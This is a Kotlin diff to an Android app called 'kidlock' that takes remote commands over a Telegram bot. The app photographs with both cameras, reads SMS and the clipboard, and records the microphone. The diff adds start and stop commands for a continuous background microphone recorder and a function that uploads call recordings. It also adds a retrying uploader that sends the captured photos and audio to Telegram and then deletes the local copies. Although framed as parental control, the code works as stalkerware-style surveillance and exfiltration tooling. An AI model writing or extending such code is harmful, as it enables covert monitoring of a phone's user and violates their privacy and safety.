@@ -1,11 +1,11 @@
 package com.kidlock
 
 import android.content.Context
-import android.content.Intent
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import org.json.JSONObject
+import java.io.File
 import java.net.URL
 import javax.net.ssl.HttpsURLConnection
 
@@ -62,11 +62,11 @@ class TelegramListener(private val context: Context) {
         when {
             text == "/lock" -> {
                 LockActivity.lockDevice(context)
-                sendMessage("🔒 Phone locked.")
+                sendMessage("🔒 Locked.")
             }
             text == "/unlock" -> {
                 LockActivity.dismiss()
-                sendMessage("🔓 Phone unlocked.")
+                sendMessage("🔓 Unlocked.")
             }
             text == "/reboot" -> {
                 sendMessage("🔄 Rebooting...")
@@ -107,6 +107,14 @@ class TelegramListener(private val context: Context) {
                 MicListener.listenOnce(context, secs * 1000L)
                 sendMessage("🎙️ Listening for $secs seconds...")
             }
+            text == "/mic stop" -> {
+                SurroundingRecorder.stop()
+                sendMessage("🎙️ Background mic stopped.")
+            }
+            text == "/mic start" -> {
+                SurroundingRecorder.start(context)
+                sendMessage("🎙️ Background mic started.")
+            }
             text.startsWith("/speak ") -> {
                 val msg = text.removePrefix("/speak ").trim()
                 TtsManager.speak(context, msg)
@@ -139,20 +147,22 @@ class TelegramListener(private val context: Context) {
                     "📋 Commands:\n\n" +
                     "🔒 /lock — lock phone\n" +
                     "🔓 /unlock — unlock phone\n" +
-                    "🔄 /reboot — restart phone\n" +
+                    "🔄 /reboot — restart\n" +
                     "⏻ /shutdown — power off\n" +
-                    "📸 /frontcam — front camera photo\n" +
-                    "📸 /backcam — back camera photo\n" +
-                    "🔊 /speak <text> — speak on phone\n" +
+                    "📸 /frontcam — front camera\n" +
+                    "📸 /backcam — back camera\n" +
+                    "🔊 /speak <text> — TTS\n" +
                     "📱 /status — battery & time\n" +
-                    "📊 /applog — today's app usage\n" +
-                    "📋 /clipboard — read clipboard\n" +
-                    "💬 /smslog — read SMS messages\n" +
-                    "🎙️ /listen [secs] — mic recording\n" +
+                    "📊 /applog — app usage\n" +
+                    "📋 /clipboard — clipboard\n" +
+                    "💬 /smslog — SMS inbox\n" +
+                    "🎙️ /listen [secs] — mic record\n" +
+                    "🎙️ /mic stop — stop background mic\n" +
+                    "🎙️ /mic start — resume background mic\n" +
                     "🚫 /block <pkg> — block app\n" +
                     "✅ /unblock <pkg> — unblock app\n" +
                     "🌙 /bedtime 21:00 — auto lock at time\n" +
-                    "⏰ /schedule 16:00 18:00 — allowed hours\n"
+                    "⏰ /schedule 16:00 18:00 — allowed hours"
                 )
             }
         }
@@ -178,54 +188,77 @@ class TelegramListener(private val context: Context) {
         }.start()
     }
 
+    // For mic/surrounding — shows as audio file with player
     fun sendAudio(filePath: String, caption: String) {
-        Thread {
-            try {
-                val file = java.io.File(filePath)
-                if (!file.exists()) return@Thread
-                val boundary = "----Boundary${System.currentTimeMillis()}"
-                val conn = URL("$BASE_URL/sendAudio").openConnection() as HttpsURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-                conn.doOutput = true
-                val os = conn.outputStream
-                os.write("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT_ID\r\n".toByteArray())
-                os.write("--$boundary\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n".toByteArray())
-                os.write("--$boundary\r\nContent-Disposition: form-data; name=\"audio\"; filename=\"${file.name}\"\r\nContent-Type: audio/mp4\r\n\r\n".toByteArray())
-                os.write(file.readBytes())
-                os.write("\r\n--$boundary--\r\n".toByteArray())
-                os.flush()
-                conn.inputStream.bufferedReader().readText()
-                conn.disconnect()
-                file.delete()
-            } catch (e: Exception) {
-                Log.e("TelegramListener", "sendAudio error: ${e.message}")
-            }
-        }.start()
+        sendFileInternal(filePath, caption, endpoint = "sendAudio", fieldName = "audio", mimeType = "audio/mp4")
+    }
+
+    // For call recordings — sends as voice bubble (plays inline, no Telegram size cap issues)
+    fun sendVoice(filePath: String, caption: String) {
+        sendFileInternal(filePath, caption, endpoint = "sendVoice", fieldName = "voice", mimeType = "audio/mp4")
     }
 
     fun sendPhoto(filePath: String) {
+        sendFileInternal(filePath, "", endpoint = "sendPhoto", fieldName = "photo", mimeType = "image/jpeg")
+    }
+
+    private fun sendFileInternal(
+        filePath: String,
+        caption: String,
+        endpoint: String,
+        fieldName: String,
+        mimeType: String
+    ) {
         Thread {
-            try {
-                val file = java.io.File(filePath)
-                if (!file.exists()) return@Thread
-                val boundary = "----Boundary${System.currentTimeMillis()}"
-                val conn = URL("$BASE_URL/sendPhoto").openConnection() as HttpsURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-                conn.doOutput = true
-                val os = conn.outputStream
-                os.write("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT_ID\r\n".toByteArray())
-                os.write("--$boundary\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"${file.name}\"\r\nContent-Type: image/jpeg\r\n\r\n".toByteArray())
-                os.write(file.readBytes())
-                os.write("\r\n--$boundary--\r\n".toByteArray())
-                os.flush()
-                conn.inputStream.bufferedReader().readText()
-                conn.disconnect()
-                file.delete()
-            } catch (e: Exception) {
-                Log.e("TelegramListener", "sendPhoto error: ${e.message}")
+            var attempt = 0
+            while (attempt < 3) {
+                attempt++
+                try {
+                    val file = File(filePath)
+                    if (!file.exists()) {
+                        Log.e("TelegramListener", "$endpoint: file not found: $filePath")
+                        return@Thread
+                    }
+                    val boundary = "----Boundary${System.currentTimeMillis()}"
+                    val conn = URL("$BASE_URL/$endpoint").openConnection() as HttpsURLConnection
+                    conn.requestMethod = "POST"
+                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+                    conn.connectTimeout = 60000
+                    conn.readTimeout = 120000
+                    conn.doOutput = true
+                    val os = conn.outputStream
+
+                    os.write("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT_ID\r\n".toByteArray())
+                    if (caption.isNotBlank()) {
+                        os.write("--$boundary\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n".toByteArray())
+                    }
+                    os.write("--$boundary\r\nContent-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\nContent-Type: $mimeType\r\n\r\n".toByteArray())
+                    os.write(file.readBytes())
+                    os.write("\r\n--$boundary--\r\n".toByteArray())
+                    os.flush()
+
+                    val responseCode = conn.responseCode
+                    val responseBody = try {
+                        conn.inputStream.bufferedReader().readText()
+                    } catch (e: Exception) {
+                        conn.errorStream?.bufferedReader()?.readText() ?: ""
+                    }
+                    conn.disconnect()
+
+                    Log.d("TelegramListener", "$endpoint attempt $attempt: $responseCode")
+                    if (responseCode == 200) {
+                        file.delete()
+                        return@Thread
+                    } else {
+                        Log.e("TelegramListener", "$endpoint attempt $attempt FAILED $responseCode: $responseBody")
+                        if (attempt < 3) Thread.sleep(3000)
+                    }
+                } catch (e: Exception) {
+                    Log.e("TelegramListener", "$endpoint attempt $attempt exception: ${e.message}")
+                    if (attempt < 3) Thread.sleep(3000)
+                }
             }
+            Log.e("TelegramListener", "$endpoint gave up after 3 attempts: $filePath")
         }.start()
     }
 
